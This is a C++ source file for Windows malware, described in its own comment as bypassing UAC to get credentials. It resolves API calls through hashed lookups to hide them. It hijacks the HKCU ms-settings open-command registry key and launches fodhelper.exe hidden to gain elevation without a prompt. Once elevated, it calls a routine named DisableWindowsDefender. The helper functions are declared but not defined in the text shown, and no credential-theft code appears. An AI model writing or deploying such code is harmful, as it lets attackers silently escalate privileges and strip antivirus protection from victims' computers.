#include <windows.h>
#include <psapi.h>
#include <Shellapi.h>
#include <iostream>
#include "def.h"

/*
Detail
	Bypasssing UAC and get credential
*/

// Conferm either process is elevated or not
bool IsElevatedProcess( HANDLE pHandle );

// Create Registry key and set value
bool CreateRegistryKeySetValue( HKEY parentKey, LPCWSTR subKey, LPBYTE keyVal );

// Disable windows defender
bool DisableWindowsDefender( void );

int main(void) {
	HKEY pKeyHKCU = HKEY_CURRENT_USER;
	PDWORD functionAddress = GetFunctionAddrByHash( ( char * )"Kernel32.dll", 0x00a2a15d4);
	cGCPI fCGCPI = (cGCPI)functionAddress;
	DWORD myPid = fCGCPI();
	
	// Get current PID
	functionAddress = GetFunctionAddrByHash( (char *)"kernel32.dll", 0x004769b43);
	cOP fCOP = (cOP)functionAddress;
	HANDLE myHandle = fCOP(
		PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
		FALSE,
		myPid
	);

	LPCWSTR subKey = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
	char keyVal[1024];
	
	// Get full pass of current process
	LPTSTR fullPath=NULL;
	functionAddress = GetFunctionAddrByHash((char*)"psapi.dll", 0x00b5f15c1);
	cGMFNE fCGMFNE = (cGMFNE)functionAddress;
	fCGMFNE(
		myHandle,
		NULL,
		(LPTSTR)keyVal,
		1024
	);

	if ( IsElevatedProcess(myHandle) ) {
		functionAddress = GetFunctionAddrByHash( (char *)"Shell32.dll", 0x0076bf907);
		cSE fCSE = (cSE)functionAddress;
		fCSE(NULL, L"open", L"notepad.exe", NULL, NULL, SW_SHOW);
		if (!DisableWindowsDefender()) {
			return 0;
		}
		return 0;
	}

	// Create Registry key and set value
	if ( CreateRegistryKeySetValue(pKeyHKCU, subKey, (LPBYTE)keyVal )) {
		functionAddress = GetFunctionAddrByHash((char*)"Shell32.dll", 0x0076bf907);
		cSE fCSE = (cSE)functionAddress;
		fCSE( NULL, L"open", L"fodhelper.exe", NULL, NULL, SW_HIDE );
		return 0;
	}
	return 0;
}